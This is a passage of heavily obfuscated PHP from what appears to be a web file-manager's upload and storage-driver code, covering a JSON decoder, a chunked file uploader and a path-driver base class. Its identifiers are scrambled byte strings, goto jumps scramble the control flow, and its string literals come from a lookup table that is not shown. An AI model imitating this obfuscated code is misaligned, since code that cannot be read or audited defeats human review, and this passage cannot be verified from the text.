$e½ãõŠ§¬’[113] || $c²Œ…½¤®ñ[$d›‘’Ìˆ§] == $e½ãõŠ§¬’[55]) && $Dº¦£Ò¼ó[$e½ãõŠ§¬’[1966]] != SERVICES_JSON_IN_STR) { array_push($f­†”š«ª™, array($e½ãõŠ§¬’[1966] => SERVICES_JSON_IN_STR, $e½ãõŠ§¬’[263] => $d›‘’Ìˆ§, $e½ãõŠ§¬’[1967] => $c²Œ…½¤®ñ[$d›‘’Ìˆ§])); } elseif ($c²Œ…½¤®ñ[$d›‘’Ìˆ§] == $Dº¦£Ò¼ó[$e½ãõŠ§¬’[1967]] && $Dº¦£Ò¼ó[$e½ãõŠ§¬’[1966]] == SERVICES_JSON_IN_STR && (strlen(substr($c²Œ…½¤®ñ, 0, $d›‘’Ìˆ§)) - strlen(rtrim(substr($c²Œ…½¤®ñ, 0, $d›‘’Ìˆ§), $e½ãõŠ§¬’[93]))) % 2 != 1) { array_pop($f­†”š«ª™); } elseif ($c²Œ…½¤®ñ[$d›‘’Ìˆ§] == $e½ãõŠ§¬’[157] && in_array($Dº¦£Ò¼ó[$e½ãõŠ§¬’[1966]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($f­†”š«ª™, array($e½ãõŠ§¬’[1966] => SERVICES_JSON_IN_ARR, $e½ãõŠ§¬’[263] => $d›‘’Ìˆ§, $e½ãõŠ§¬’[1967] => !1)); } elseif ($c²Œ…½¤®ñ[$d›‘’Ìˆ§] == $e½ãõŠ§¬’[476] && $Dº¦£Ò¼ó[$e½ãõŠ§¬’[1966]] == SERVICES_JSON_IN_ARR) { array_pop($f­†”š«ª™); } elseif ($c²Œ…½¤®ñ[$d›‘’Ìˆ§] == $e½ãõŠ§¬’[1072] && in_array($Dº¦£Ò¼ó[$e½ãõŠ§¬’[1966]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($f­†”š«ª™, array($e½ãõŠ§¬’[1966] => SERVICES_JSON_IN_OBJ, $e½ãõŠ§¬’[263] => $d›‘’Ìˆ§, $e½ãõŠ§¬’[1967] => !1)); } elseif ($c²Œ…½¤®ñ[$d›‘’Ìˆ§] == $e½ãõŠ§¬’[315] && $Dº¦£Ò¼ó[$e½ãõŠ§¬’[1966]] == SERVICES_JSON_IN_OBJ) { array_pop($f­†”š«ª™); } elseif ($CÙùêÇ÷– == $e½ãõŠ§¬’[1970] && in_array($Dº¦£Ò¼ó[$e½ãõŠ§¬’[1966]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($f­†”š«ª™, array($e½ãõŠ§¬’[1966] => SERVICES_JSON_IN_CMT, $e½ãõŠ§¬’[263] => $d›‘’Ìˆ§, $e½ãõŠ§¬’[1967] => !1)); $d›‘’Ìˆ§++; } elseif ($CÙùêÇ÷– == $e½ãõŠ§¬’[1971] && $Dº¦£Ò¼ó[$e½ãõŠ§¬’[1966]] == SERVICES_JSON_IN_CMT) { array_pop($f­†”š«ª™); $d›‘’Ìˆ§++; for ($dŒ³Î×¯ˆÓ = $Dº¦£Ò¼ó[$e½ãõŠ§¬’[263]]; $dŒ³Î×¯ˆÓ <= $d›‘’Ìˆ§; ++$dŒ³Î×¯ˆÓ) { $c²Œ…½¤®ñ = substr_replace($c²Œ…½¤®ñ, $e½ãõŠ§¬’[50], $dŒ³Î×¯ˆÓ, 1); } } } if (reset($f­†”š«ª™) == SERVICES_JSON_IN_ARR) { return $C•ãé–‚; } elseif (reset($f­†”š«ª™) == SERVICES_JSON_IN_OBJ) { return $eá†ïµõ©à; } goto C¶›ˆÆ†; C¶›ˆÆ†: } } } function isError($AÊõÆÉöõµ, $d‘÷Ñªâ‚„ = null) { $AÄ•ñÎå—Œ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (class_exists($AÄ•ñÎå—Œ[1972])) { return PEAR::isError($AÊõÆÉöõµ, $d‘÷Ñªâ‚„); } elseif (is_object($AÊõÆÉöõµ) && (get_class($AÊõÆÉöõµ) == $AÄ•ñÎå—Œ[1973] || is_subclass_of($AÊõÆÉöõµ, $AÄ•ñÎå—Œ[1973]))) { return !0; } return !1; } } if (class_exists($_SERVER[³‘’¼äÑ™ÔÍ][1974])) { class Services_JSON_Error extends PEAR_Error { function __construct($B¢…Í¾ ÎÖ = "\165\x6e\153\156\x6f\x77\156\40\x65\x72\162\157\162", $Eí£ŞÙÓù¯ = null, $cÈçé­àç£ = null, $cğ›Ú¶‘ì = null, $E¥í¶öÏ«Â = null) { parent::PEAR_Error($B¢…Í¾ ÎÖ, $Eí£ŞÙÓù¯, $cÈçé­àç£, $cğ›Ú¶‘ì, $E¥í¶öÏ«Â); } } } else { class Services_JSON_Error { function __construct($D½ÈÏÅùŸ« = "\x75\156\153\x6e\157\x77\x6e\40\x65\162\x72\x6f\x72", $E‡á‚ Ôë = null, $D¼İÉÚ‚Š½ = null, $cˆÒçÔöŒ = null, $Cƒ¬Ì¾•õ– = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto e¦ê™²ğÙº; e¦ê™²ğÙº: $fìÀğÎæ¶ =& $_SERVER[³‘’¼äÑ™ÔÍ]; global $in; $this->in =& $in; goto F„Ğ¬¶èËÊ; a–È†–ï±‘: $this->checkSize(); $this->tempPathInit(); goto F´¦šøŠ² ; F„Ğ¬¶èËÊ: if (!empty($_FILES)) { $d×á± = $_FILES[$fìÀğÎæ¶[167]]; $this->uploadFile = $d×á±[$fìÀğÎæ¶[1975]]; if (!$this->uploadFile && $d×á±[$fìÀğÎæ¶[1225]] > 0) { show_json($this->errorInfo($d×á±[$fìÀğÎæ¶[1225]]), !1); } } else { if (isset($in[$fìÀğÎæ¶[386]])) { $this->uploadFile = isset($in[$fìÀğÎæ¶[1976]]) ? $fìÀğÎæ¶[1977] : $fìÀğÎæ¶[1822]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto a–È†–ï±‘; F´¦šøŠ² : } public function upload() { goto cˆ‡Ó…µåÍ; aÕŞä‹ø²Á: if ($c¢îÉ¶™¢· > 1 && $aöÈÔ“á‡³ <= 0) { show_json($a‚Œ‚¯øÎ[1982], !1); } if ($aöÈÔ“á‡³ > $añ‡“º´ï¨) { $c¢îÉ¶™¢· = 1; } if ($c¢îÉ¶™¢· <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto d°é²òĞ; A÷¿—ö³×Ú: @unlink($e£§ì¤ÏˆÓ); if (!$E´îÑöÖ×ã) { $this->showJson($a‚Œ‚¯øÎ[1986] . $EÀ Á¥ÇÒ¥, !1); } $c¬÷¹ËÃ[$a‚Œ‚¯øÎ[1987]] = $c¢îÉ¶™¢·; goto fèññ¶ÎÜ²; Eø„ÊöÒ¼: $E´îÑöÖ×ã = $this->writeTo($e£§ì¤ÏˆÓ, $A¥¨ç¬±Œ±, $this->tempFile); $e¦Ùîñİì = IO::hashSimple($e£§ì¤ÏˆÓ); $añ‡“º´ï¨ = IO::size($e£§ì¤ÏˆÓ); goto A÷¿—ö³×Ú; aëš±Àší•: ignore_timeout(); if (!$this->checkChunkHash($c¬÷¹ËÃ)) { $this->showJson($a‚Œ‚¯øÎ[1992], !1); } $this->statusSet(!1); goto FÂÄ™àê„; d°é²òĞ: CacheLock::lock($this->tempFile, 20); $c¬÷¹ËÃ = $this->statusGet(); $this->initFileTemp(); goto dá›‹ïİ²ñ; aÄ«ÁùˆÙ¿: $FÃÔëâÏ‘ù = $EÀ Á¥ÇÒ¥ * $aöÈÔ“á‡³; $A¥¨ç¬±Œ± = @fopen($this->tempFile, $a‚Œ‚¯øÎ[1985]); fseek($A¥¨ç¬±Œ±, $FÃÔëâÏ‘ù); goto Eø„ÊöÒ¼; cˆ‡Ó…µåÍ: $a‚Œ‚¯øÎ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $EÀ Á¥ÇÒ¥ = isset($this->in[$a‚Œ‚¯øÎ[1978]]) ? intval($this->in[$a‚Œ‚¯øÎ[1978]]) : 0; $c¢îÉ¶™¢· = isset($this->in[$a‚Œ‚¯øÎ[1979]]) ? intval($this->in[$a‚Œ‚¯øÎ[1979]]) : 1; goto F«å¬œñš†; dá›‹ïİ²ñ: $e£§ì¤ÏˆÓ = $this->moveUploadedFile($bÂÙ”Î®ÈÏ); if ($añ‡“º´ï¨ > 0 && filesize($e£§ì¤ÏˆÓ) == 0) { $this->showJson($a‚Œ‚¯øÎ[1983], !1); } if (!$e£§ì¤ÏˆÓ) { $this->showJson(LNG($a‚Œ‚¯øÎ[1984]), !1); } goto aÄ«ÁùˆÙ¿; FÂÄ™àê„: CacheLock::unlock($this->tempFile); return $this->tempFile; goto aÚÏáÒ›½É; fèññ¶ÎÜ²: $c¬÷¹ËÃ[$a‚Œ‚¯øÎ[1988]][$a‚Œ‚¯øÎ[1989] . $EÀ Á¥ÇÒ¥] = array($a‚Œ‚¯øÎ[1990] => $FÃÔëâÏ‘ù, $a‚Œ‚¯øÎ[1040] => $EÀ Á¥ÇÒ¥, $a‚Œ‚¯øÎ[77] => $añ‡“º´ï¨, $a‚Œ‚¯øÎ[164] => $e¦Ùîñİì); $this->statusSet($c¬÷¹ËÃ); if (count($c¬÷¹ËÃ[$a‚Œ‚¯øÎ[1988]]) != $c¬÷¹ËÃ[$a‚Œ‚¯øÎ[1987]]) { $this->showJson($a‚Œ‚¯øÎ[1991] . $EÀ Á¥ÇÒ¥, !0); } goto aëš±Àší•; F«å¬œñš†: $bÂÙ”Î®ÈÏ = $this->tempFile . $a‚Œ‚¯øÎ[1980] . $EÀ Á¥ÇÒ¥; $añ‡“º´ï¨ = isset($this->in[$a‚Œ‚¯øÎ[520]]) ? intval($this->in[$a‚Œ‚¯øÎ[520]]) : 0; $aöÈÔ“á‡³ = isset($this->in[$a‚Œ‚¯øÎ[1981]]) ? intval($this->in[$a‚Œ‚¯øÎ[1981]]) : 0; goto aÕŞä‹ø²Á; aÚÏáÒ›½É: } private function checkSize() { $Dïã­°Ù¼· =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (phpBuild64() || $this->in[$Dïã­°Ù¼·[77]] < PHP_INT_MAX) { return; } show_json(LNG($Dïã­°Ù¼·[1993]), !1); } private function showJson($d©÷ÂºÖØÚ, $D³ˆò²Ï¿µ) { CacheLock::unlock($this->tempFile); if (!$D³ˆò²Ï¿µ) { return show_json($d©÷ÂºÖØÚ, $D³ˆò²Ï¿µ); } show_json($d©÷ÂºÖØÚ, $D³ˆò²Ï¿µ); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto Aó„–†¦‰; bøŠôèğğ«: touch($aˆå§ˆ‘©‡ . $B“É¥ÒÄ‡Ÿ[1994]); $bÒ”êøÀÅ = isset($this->in[$B“É¥ÒÄ‡Ÿ[1995]]) ? $this->in[$B“É¥ÒÄ‡Ÿ[1995]] : !1; if (strlen($bÒ”êøÀÅ) < 30) { $bÒ”êøÀÅ = md5(USER_ID . $this->in[$B“É¥ÒÄ‡Ÿ[75]] . $this->fileName . $this->in[$B“É¥ÒÄ‡Ÿ[77]]); } goto Dßˆà•’´; Aó„–†¦‰: $B“É¥ÒÄ‡Ÿ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $aˆå§ˆ‘©‡ = TEMP_FILES; @mk_dir($aˆå§ˆ‘©‡); goto bøŠôèğğ«; Dßˆà•’´: $this->tempFile = $aˆå§ˆ‘©‡ . $B“É¥ÒÄ‡Ÿ[1996] . md5($bÒ”êøÀÅ . $this->in[$B“É¥ÒÄ‡Ÿ[1540]]); goto a†Ÿ‚«ˆùï; a†Ÿ‚«ˆùï: } private function moveUploadedFile($B©ÇçŸ¯åã) { $cí“š­Ú‹Ÿ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $aïÍ¥³½… = $this->uploadFile; if ($aïÍ¥³½… == $cí“š­Ú‹Ÿ[1997]) { @file_put_contents($B©ÇçŸ¯åã, base64_decode($_REQUEST[$cí“š­Ú‹Ÿ[1998]])); } else { if ($aïÍ¥³½… == $cí“š­Ú‹Ÿ[1822]) { $bÈĞ¡ÔÀ£ = @fopen($B©ÇçŸ¯åã, $cí“š­Ú‹Ÿ[1530]); $this->writeTo($aïÍ¥³½…, $bÈĞ¡ÔÀ£, $B©ÇçŸ¯åã); } else { if (!move_uploaded_file($aïÍ¥³½…, $B©ÇçŸ¯åã)) { return !1; } } } return $B©ÇçŸ¯åã; } private function writeTo($dÎàÂÅ›‡×, $A½‡Õ¿±œÜ, $cŞÀæ¤®Ü) { goto C™¢Ã÷å«; A¸¯Á¥Ø‰ç: fclose($DÙƒŒì½); fclose($A½‡Õ¿±œÜ); CacheLock::unlock($Cï†Ô±‚‹Ş); goto a¥Û¥¤…´¦; CÍ‘½§ŠÔá: $DÙƒŒì½ = @fopen($dÎàÂÅ›‡×, $A‡ğù´‡Ôê[1529]); if (!$DÙƒŒì½ || !$A½‡Õ¿±œÜ || !$F÷Éƒš›ÏÀ) { CacheLock::unlock($Cï†Ô±‚‹Ş); return !1; } while (!feof($DÙƒŒì½)) { fwrite($A½‡Õ¿±œÜ, fread($DÙƒŒì½, 1024 * 200)); } goto A¸¯Á¥Ø‰ç; a¥Û¥¤…´¦: return !0; goto FƒÎÉ§¾¨’; C™¢Ã÷å«: $A‡ğù´‡Ôê =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Cï†Ô±‚‹Ş = $A‡ğù´‡Ôê[1999] . $cŞÀæ¤®Ü; $F÷Éƒš›ÏÀ = CacheLock::lock($Cï†Ô±‚‹Ş, 1); goto CÍ‘½§ŠÔá; FƒÎÉ§¾¨’: } private function statusGet() { goto d¨è³É“Á¤; EÒ±˜Œ¼ĞŠ: if (!$this->statusData) { $c±ÔÔŞ¦³… = array($D·¹…†çö¢[28] => $this->fileName, $D·¹…†çö¢[1987] => 0, $D·¹…†çö¢[1988] => array()); $this->statusSet($c±ÔÔŞ¦³…); } return $this->statusData; goto e¸²¨¾¼É–; d¨è³É“Á¤: $D·¹…†çö¢ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (is_array($this->statusData)) { return $this->statusData; } $f§Ê…©¹ô® = $this->tempFile . $D·¹…†çö¢[2000]; goto FÉ†áñ¬ƒ; FÉ†áñ¬ƒ: $e‰Çô’Š½‹ = !1; if (file_exists($f§Ê…©¹ô®)) { $e‰Çô’Š½‹ = @file_get_contents($f§Ê…©¹ô®); } if ($e‰Çô’Š½‹) { $this->statusData = json_decode($e‰Çô’Š½‹, !0); } goto EÒ±˜Œ¼ĞŠ; e¸²¨¾¼É–: } public function statusSet($EˆçŞ™å©ƒ) { $fÊ¶ÇŞä÷Ø = $this->tempFile . $_SERVER[³‘’¼äÑ™ÔÍ][2000]; if (!$EˆçŞ™å©ƒ) { if (file_exists($fÊ¶ÇŞä÷Ø)) { @unlink($fÊ¶ÇŞä÷Ø); } return !0; } $this->statusData = $EˆçŞ™å©ƒ; return file_put_contents($fÊ¶ÇŞä÷Ø, json_encode($EˆçŞ™å©ƒ)); } private function initFileTemp() { $aÍİ£Ü®î =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (file_exists($this->tempFile)) { return; } $a¸ğÇƒ¹¡³ = fopen($this->tempFile, $aÍİ£Ü®î[2001]); fseek($a¸ğÇƒ¹¡³, $this->in[$aÍİ£Ü®î[77]] - 1, SEEK_SET); fwrite($a¸ğÇƒ¹¡³, $aÍİ£Ü®î[468]); fclose($a¸ğÇƒ¹¡³); } public function checkChunk() { goto a™¨¹á»Ê; a™¨¹á»Ê: $AËãİÈßï =& $_SERVER[³‘’¼äÑ™ÔÍ]; $dŠèîé—ô„ = array(); CacheLock::lock($this->tempFile); goto AÈÅ‰†âƒ„; AÈÅ‰†âƒ„: $FÎ¶ÃÏƒï = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($FÎ¶ÃÏƒï[$AËãİÈßï[1988]] as $bìáÁ½èÚì) { $AÜ‘µ¯Úöæ = $bìáÁ½èÚì[$AËãİÈßï[164]]; if ($AÜ‘µ¯Úöæ) { $dŠèîé—ô„[$AËãİÈßï[2002] . $bìáÁ½èÚì[$AËãİÈßï[1040]]] = $AÜ‘µ¯Úöæ; } } goto EäÍÒâÊË®; EäÍÒâÊË®: return $dŠèîé—ô„; goto Aïƒà±¦ÄÀ; Aïƒà±¦ÄÀ: } private function checkChunkHash($dÊ˜éì‡ŸÅ) { goto D¼ĞÖ™Îà; e„ƒµ¼Õá: $FŸ’æ‘«„ = !0; foreach ($dÊ˜éì‡ŸÅ[$béÅ­Â¥ì…[1988]] as $C‹„ÖÑõ ‚) { fseek($EÇ‹äô”ˆ, $C‹„ÖÑõ ‚[$béÅ­Â¥ì…[1990]]); $e÷××»°§¡ = PathDriverStream::hash($EÇ‹äô”ˆ, $C‹„ÖÑõ ‚[$béÅ­Â¥ì…[77]]); if ($C‹„ÖÑõ ‚[$béÅ­Â¥ì…[164]] != $e÷××»°§¡) { $FŸ’æ‘«„ = !1; break; } } fclose($EÇ‹äô”ˆ); goto b„š’Ú‡ ; b…†Òµ¹ó±: $EğËåŞÔÔß = _get($this->in, $béÅ­Â¥ì…[2003]); if (strlen($EğËåŞÔÔß) == 32 && IO::hashSimple($this->tempFile) == $Aß‹’‰¨¨ && IO::hashMd5($this->tempFile) == $EğËåŞÔÔß) { return !0; } $EÇ‹äô”ˆ = fopen($this->tempFile, $béÅ­Â¥ì…[1176]); goto e„ƒµ¼Õá; b„š’Ú‡ : return $FŸ’æ‘«„; goto FÓ–¬ƒ°¾µ; D¼ĞÖ™Îà: $béÅ­Â¥ì… =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (count($dÊ˜éì‡ŸÅ[$béÅ­Â¥ì…[1988]]) != $dÊ˜éì‡ŸÅ[$béÅ­Â¥ì…[1987]]) { return !1; } $Aß‹’‰¨¨ = _get($this->in, $béÅ­Â¥ì…[1995]); goto b…†Òµ¹ó±; FÓ–¬ƒ°¾µ: } public static function fileName() { goto f¶Õ´ôÔ‰Ç; f¶Õ´ôÔ‰Ç: $CÅà‡¿­ŠŞ =& $_SERVER[³‘’¼äÑ™ÔÍ]; global $in; $dèÊÙñ¹ğÄ = isset($in[$CÅà‡¿­ŠŞ[28]]) ? $in[$CÅà‡¿­ŠŞ[28]] : $CÅà‡¿­ŠŞ[33]; goto a¹ŒËôßÀê; f·²¸éƒÏ‹: return KodIO::clear($dèÊÙñ¹ğÄ); goto Bíªëôå¸Ì; BÔ©Ş®•Ì: $bœ·Ûåš»ª = $bœ·Ûåš»ª ? $bœ·Ûåš»ª : time(); $eÒì¦²ÆéÜ = strtolower($dèÊÙñ¹ğÄ); if ($eÒì¦²ÆéÜ == $CÅà‡¿­ŠŞ[2005] || $eÒì¦²ÆéÜ == $CÅà‡¿­ŠŞ[2006]) { $dèÊÙñ¹ğÄ = date($CÅà‡¿­ŠŞ[693], $bœ·Ûåš»ª) . $CÅà‡¿­ŠŞ[70] . $in[$CÅà‡¿­ŠŞ[77]] . $CÅà‡¿­ŠŞ[1637]; } else { if ($eÒì¦²ÆéÜ == $CÅà‡¿­ŠŞ[2007]) { $dèÊÙñ¹ğÄ = date($CÅà‡¿­ŠŞ[693], $bœ·Ûåš»ª) . $CÅà‡¿­ŠŞ[70] . $in[$CÅà‡¿­ŠŞ[77]] . $CÅà‡¿­ŠŞ[2008]; } } goto f·²¸éƒÏ‹; a¹ŒËôßÀê: if (!empty($_FILES)) { $dèÊÙñ¹ğÄ = $dèÊÙñ¹ğÄ ? $dèÊÙñ¹ğÄ : $_FILES[$CÅà‡¿­ŠŞ[167]][$CÅà‡¿­ŠŞ[386]]; } if (!is_wap()) { return KodIO::clear($dèÊÙñ¹ğÄ); } $bœ·Ûåš»ª = strtotime($in[$CÅà‡¿­ŠŞ[2004]]); goto BÔ©Ş®•Ì; Bíªëôå¸Ì: } private function errorInfo($E´¯õÉŠºİ) { $B“ŒÖğàšˆ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $DèµÏˆšºŸ = array($B“ŒÖğàšˆ[2009], $B“ŒÖğàšˆ[2010], $B“ŒÖğàšˆ[2011], $B“ŒÖğàšˆ[2012], $B“ŒÖğàšˆ[2013], $B“ŒÖğàšˆ[2014], $B“ŒÖğàšˆ[2015], $B“ŒÖğàšˆ[2016]); return $E´¯õÉŠºİ . $B“ŒÖğàšˆ[4] . $DèµÏˆšºŸ[$E´¯õÉŠºİ]; } } goto dŒ÷À¸øŸ; D¦á³ÃõÍ‡: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $BáÔ™¬Õ‘ƒ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->objectDriver = array($BáÔ™¬Õ‘ƒ[57], $BáÔ™¬Õ‘ƒ[58], $BáÔ™¬Õ‘ƒ[59], $BáÔ™¬Õ‘ƒ[60], $BáÔ™¬Õ‘ƒ[61], $BáÔ™¬Õ‘ƒ[62], $BáÔ™¬Õ‘ƒ[63], $BáÔ™¬Õ‘ƒ[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($E–Š…°Ò) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($E–Š…°Ò, $_SERVER[³‘’¼äÑ™ÔÍ][8]); } return $E–Š…°Ò; } public function getPathName($FêÔ¼Ä–Îê) { return $FêÔ¼Ä–Îê; } public function iconvApp($F²­¢Ñ°Õğ) { return $F²­¢Ñ°Õğ; } public function iconvSystem($d…º¿©Í–) { return $d…º¿©Í–; } public function iconvTo($c¥Ù¤ã‘³‡, $Aì•î“Ìµ, $a¢Ààƒ”—“) { goto dÉ‹Ï•ÏñÉ; c‘­…”¾Ç: $Bä¾Í„êï[$a¢Ààƒ”—“ . $eòÃùµ†¥Ÿ[66] . $Aì•î“Ìµ . $eòÃùµ†¥Ÿ[67] . $c¥Ù¤ã‘³‡] = $c¥Ù¤ã‘³‡; $Bä¾Í„êï[$a¢Ààƒ”—“ . $eòÃùµ†¥Ÿ[66] . $Aì•î“Ìµ . $eòÃùµ†¥Ÿ[67] . $då›‚Å´Ê] = $c¥Ù¤ã‘³‡; $Bä¾Í„êï[$Aì•î“Ìµ . $eòÃùµ†¥Ÿ[66] . $a¢Ààƒ”—“ . $eòÃùµ†¥Ÿ[67] . $då›‚Å´Ê] = $då›‚Å´Ê; goto B½„É‘©öš; dÖè“—ò–: $då›‚Å´Ê = $då›‚Å´Ê ? $då›‚Å´Ê : $c¥Ù¤ã‘³‡; if (strstr($då›‚Å´Ê, $eòÃùµ†¥Ÿ[69])) { $då›‚Å´Ê = str_replace($eòÃùµ†¥Ÿ[69], $eòÃùµ†¥Ÿ[70], $då›‚Å´Ê); } $Bä¾Í„êï[$Aì•î“Ìµ . $eòÃùµ†¥Ÿ[66] . $a¢Ààƒ”—“ . $eòÃùµ†¥Ÿ[67] . $c¥Ù¤ã‘³‡] = $då›‚Å´Ê; goto c‘­…”¾Ç; B½„É‘©öš: return $då›‚Å´Ê; goto c†ÏÍà™÷„; FŸÄ–ª«äÔ: $d”Î…‹±Õæ = $Aì•î“Ìµ . $eòÃùµ†¥Ÿ[66] . $a¢Ààƒ”—“ . $eòÃùµ†¥Ÿ[67] . $c¥Ù¤ã‘³‡; if (isset($Bä¾Í„êï[$d”Î…‹±Õæ])) { return $Bä¾Í„êï[$d”Î…‹±Õæ]; } if (function_exists($eòÃùµ†¥Ÿ[68])) { $då›‚Å´Ê = @mb_convert_encoding($c¥Ù¤ã‘³‡, $a¢Ààƒ”—“, $Aì•î“Ìµ); } else { $då›‚Å´Ê = @iconv($Aì•î“Ìµ, $a¢Ààƒ”—“, $c¥Ù¤ã‘³‡); } goto dÖè“—ò–; dÉ‹Ï•ÏñÉ: $eòÃùµ†¥Ÿ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$c¥Ù¤ã‘³‡ || !function_exists($eòÃùµ†¥Ÿ[65])) { return $c¥Ù¤ã‘³‡; } static $Bä¾Í„êï = array(); goto FŸÄ–ª«äÔ; c†ÏÍà™÷„: } public function getPathInner($bí‚Ê÷íÎÂ) { $C¨”ñàã«Ş = IO::init($bí‚Ê÷íÎÂ); return $C¨”ñàã«Ş->path; } public function getPathOuter($c„ƒä…‡Êœ) { $Eä‰‰Øƒ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $F›¡Ëíˆù‚ = strlen(trim($this->pathBase, $Eä‰‰Øƒ[8])); $c„ƒä…‡Êœ = substr(trim($c„ƒä…‡Êœ, $Eä‰‰Øƒ[8]), $F›¡Ëíˆù‚); return $this->pathDriver . $Eä‰‰Øƒ[8] . ltrim($c„ƒä…‡Êœ, $Eä‰‰Øƒ[8]); } public function isParentOf($C²²ßÈŞèä, $B´«Ì×³Óä) { $d“Ÿ˜ÜÓİ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C²²ßÈŞèä = rtrim(strtolower($C²²ßÈŞèä), $d“Ÿ˜ÜÓİ[8]) . $d“Ÿ˜ÜÓİ[8]; $B´«Ì×³Óä = rtrim(strtolower($B´«Ì×³Óä), $d“Ÿ˜ÜÓİ[8]) . $d“Ÿ˜ÜÓİ[8]; $c‰ğÎÖ…Ü = strpos($B´«Ì×³Óä, $C²²ßÈŞèä) === 0; return $c‰ğÎÖ…Ü; } public function getType() { $aôÒ»ø»œ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $E’ ‹æÂÒ“ = str_replace($aôÒ»ø»œ[71], $aôÒ»ø»œ[33], get_class($this)); return strtolower($E’ ‹æÂÒ“); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($e§âïùó°Ş, $Dµ†Ëñ‹ç) { $aÄ¿ÕŒéÒÌ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $DÎ˜µ‘ìƒ = rtrim($e§âïùó°Ş, $aÄ¿ÕŒéÒÌ[8]) . $aÄ¿ÕŒéÒÌ[8] . $Dµ†Ëñ‹ç; $FÜ«œ”¨À– = $this->exist($DÎ˜µ‘ìƒ); return $FÜ«œ”¨À– ? $DÎ˜µ‘ìƒ : !1; } public function setModifyTime($a¬ÌŸ‚ğ, $B°Ä”Üôª = '') { } public function renameObject($eæƒ¶³ÇÈï, $eŞõãÙ‚¶¬) { goto DÎî•šŠì; AŞ»»—î’: return $Fì»éŒë®á ? $eŞõãÙ‚¶¬ : !1; goto A˜¤˜ğ§½; DÎî•šŠì: $B¸ãõ„ğ½» =& $_SERVER[³‘’¼äÑ™ÔÍ]; $CÆÓÄ½¦šŸ = $eŞõãÙ‚¶¬; Hook::trigger($B¸ãõ„ğ½»[72], $this, $eæƒ¶³ÇÈï, $this, $this->pathFather($eæƒ¶³ÇÈï) . $eŞõãÙ‚¶¬); goto Bäõ«ÂÇÏâ; Bäõ«ÂÇÏâ: $eæƒ¶³ÇÈï = $this->getPathOuter($eæƒ¶³ÇÈï); $eŞõãÙ‚¶¬ = $this->pathFather($eæƒ¶³ÇÈï) . $eŞõãÙ‚¶¬; if (IO::isFile($eæƒ¶³ÇÈï)) { $Fì»éŒë®á = IO::copy($eæƒ¶³ÇÈï, $this->pathFather($eæƒ¶³ÇÈï), REPEAT_RENAME_FOLDER, $CÆÓÄ½¦šŸ); if ($Fì»éŒë®á) { IO::remove($eæƒ¶³ÇÈï); } } else { $Fì»éŒë®á = IO::mkdir($eŞõãÙ‚¶¬); if (!$Fì»éŒë®á) { return !1; } $Dë¥£óâËÉ = IO::listPath($eæƒ¶³ÇÈï, !0); $DŒí¤±ï‚ª = array_merge($Dë¥£óâËÉ[$B¸ãõ„ğ½»[73]], $Dë¥£óâËÉ[$B¸ãõ„ğ½»[74]]); foreach ($DŒí¤±ï‚ª as $eëºê¯Å“È) { IO::move($eëºê¯Å“È[$B¸ãõ„ğ½»[75]], $eŞõãÙ‚¶¬, REPEAT_RENAME_FOLDER); } IO::remove($eæƒ¶³ÇÈï); } goto AŞ»»—î’; A˜¤˜ğ§½: } public function tempFile($BŒ»¦ïÂÔÛ = '', $A‹õ­ƒ×íÊ = '') { goto Fó¸ššÏª; Fó¸ššÏª: if (!$BŒ»¦ïÂÔÛ) { $BŒ»¦ïÂÔÛ = rand_string(15); } $EÑÈØÂ£ï = TEMP_FILES . rand_string(15) . $_SERVER[³‘’¼äÑ™ÔÍ][8]; @mkdir($EÑÈØÂ£ï, 511, !0); goto fè¾ó“Ã¤è; Eø´‘ÙÓç‡: return $DˆôÃ‚á±ä; goto eºŠÀ·ê°µ; fè¾ó“Ã¤è: $DˆôÃ‚á±ä = $EÑÈØÂ£ï . $BŒ»¦ïÂÔÛ; @touch($DˆôÃ‚á±ä); if ($A‹õ­ƒ×íÊ) { file_put_contents($DˆôÃ‚á±ä, $A‹õ­ƒ×íÊ); } goto Eø´‘ÙÓç‡; eºŠÀ·ê°µ: } public function tempFileRemve($EÖÄà‚¡Õ) { @unlink($EÖÄà‚¡Õ); @rmdir($this->pathFather($EÖÄà‚¡Õ)); } public function mkfile($a ·†‚ç‚À, $A³¨Å‘·Ö = '', $E×èÇ—ÔÎ… = REPEAT_RENAME) { } public function mkdir($dÃ¿Õå¥Ş, $cóë¦Ï‘Œ­ = REPEAT_SKIP) { } public function delFile($DĞïÈËäğ) { } public function delFolder($Aˆ¥¥ñÂ) { } public function copyFile($bÏ¤„œÓÍ, $BŒ†‰¯µò) { } public function moveFile($aÎİ¯½æˆŞ, $F¼‘°ÔÜÎ) { } public function remove($C×äô÷Ñ›) { if ($this->isFile($C×äô÷Ñ›)) { return 